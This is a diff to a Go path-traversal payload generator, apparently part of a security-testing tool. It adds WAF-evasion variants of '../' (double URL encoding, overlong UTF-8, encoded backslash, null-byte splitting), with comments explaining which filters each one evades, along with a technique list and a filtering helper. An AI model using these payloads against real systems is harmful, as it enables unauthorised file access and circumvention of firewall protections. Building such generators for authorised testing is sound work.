@@ -153,6 +153,66 @@ func Generate(targetPath string, maxDepth int) []Payload {
 		Category:  "traversal",
 	})
 
+	// ── WAF-evasion encodings ─────────────────────────────────────────────────
+	// These variants target web application firewalls and naive input filters
+	// that pattern-match on the literal "../" or "..\\" sequence. The payloads
+	// below still normalise to "../" on the server but evade signature matching.
+
+	// ..%252f — mixed double-encoding: dots plain, slash double-URL-encoded.
+	// Slips past WAF rules keyed on "%2f" while still decoding to "../" on
+	// servers that URL-decode twice before path resolution.
+	for d := 1; d <= maxDepth; d++ {
+		payloads = append(payloads, Payload{
+			Value:     strings.Repeat("..%252f", d) + targetPath,
+			Technique: "waf-double-slash",
+			Category:  "traversal",
+		})
+	}
+
+	// ..%c0%af — dots plain, slash as overlong-UTF8 "/".
+	// Bypasses filters that decode standard percent-encoding but not overlong
+	// UTF-8, common on older JVM/IIS stacks behind a WAF.
+	for d := 1; d <= maxDepth; d++ {
+		payloads = append(payloads, Payload{
+			Value:     strings.Repeat("..%c0%af", d) + targetPath,
+			Technique: "waf-overlong-slash",
+			Category:  "traversal",
+		})
+	}
+
+	// ..%5c — Windows backslash URL-encoded.
+	// Targets Windows back-ends behind a WAF that only blocks forward-slash
+	// traversal; the OS treats "\\" as a path separator.
+	for d := 1; d <= maxDepth; d++ {
+		payloads = append(payloads, Payload{
+			Value:     strings.Repeat("..%5c", d) + targetPath,
+			Technique: "waf-encoded-backslash",
+			Category:  "traversal",
+		})
+	}
+
+	// ./../ — leading dot-slash noise prefix. Some WAF normalisers collapse
+	// "./" but the surviving "../" still traverses; defeats rules that only
+	// inspect the first few characters of the value.
+	for d := 1; d <= maxDepth; d++ {
+		payloads = append(payloads, Payload{
+			Value:     "./" + strings.Repeat("../", d) + targetPath,
+			Technique: "waf-dotslash-prefix",
+			Category:  "traversal",
+		})
+	}
+
+	// ..%00/ — interstitial null byte inside the sequence. A null embedded
+	// between the dots and slash can split a WAF's pattern match while being
+	// stripped by the back-end before path resolution.
+	for d := 1; d <= maxDepth; d++ {
+		payloads = append(payloads, Payload{
+			Value:     strings.Repeat("..%00/", d) + targetPath,
+			Technique: "waf-null-interstitial",
+			Category:  "traversal",
+		})
+	}
+
 	// ── Wrapper techniques ────────────────────────────────────────────────────
 	// PHP stream wrappers bypass include() path resolution entirely.
 	// Only applicable when the target interprets the value as a PHP stream.
@@ -170,4 +230,55 @@ func Generate(targetPath string, maxDepth int) []Payload {
 	})
 
 	return payloads
+}
+
+// Techniques returns the set of technique identifiers Generate can emit, in
+// the same order Generate produces them. Useful for validating a caller's
+// --techniques selection and for documentation/help output.
+func Techniques() []string {
+	return []string{
+		"dotdot-slash",
+		"dotdot-backslash",
+		"dotdotdotdot-doubleslash",
+		"url-encoded",
+		"url-encoded-dots",
+		"url-encoded-slash",
+		"double-url-encoded",
+		"overlong-utf8",
+		"unicode-fullwidth",
+		"null-byte-percent",
+		"null-byte-raw",
+		"absolute-path",
+		"waf-double-slash",
+		"waf-overlong-slash",
+		"waf-encoded-backslash",
+		"waf-dotslash-prefix",
+		"waf-null-interstitial",
+		"php-filter",
+		"file-uri",
+	}
+}
+
+// GenerateFiltered behaves like Generate but keeps only payloads whose
+// Technique is present in the include set. A nil or empty include set means
+// "all techniques" (identical to Generate). Unknown technique names in the
+// include set are ignored here; callers should validate against Techniques()
+// first if they want to reject typos. The returned slice preserves Generate's
+// most-to-least-likely ordering.
+func GenerateFiltered(targetPath string, maxDepth int, include []string) []Payload {
+	all := Generate(targetPath, maxDepth)
+	if len(include) == 0 {
+		return all
+	}
+	want := make(map[string]bool, len(include))
+	for _, t := range include {
+		want[t] = true
+	}
+	filtered := make([]Payload, 0, len(all))
+	for _, p := range all {
+		if want[p.Technique] {
+			filtered = append(filtered, p)
+		}
+	}
+	return filtered
 }
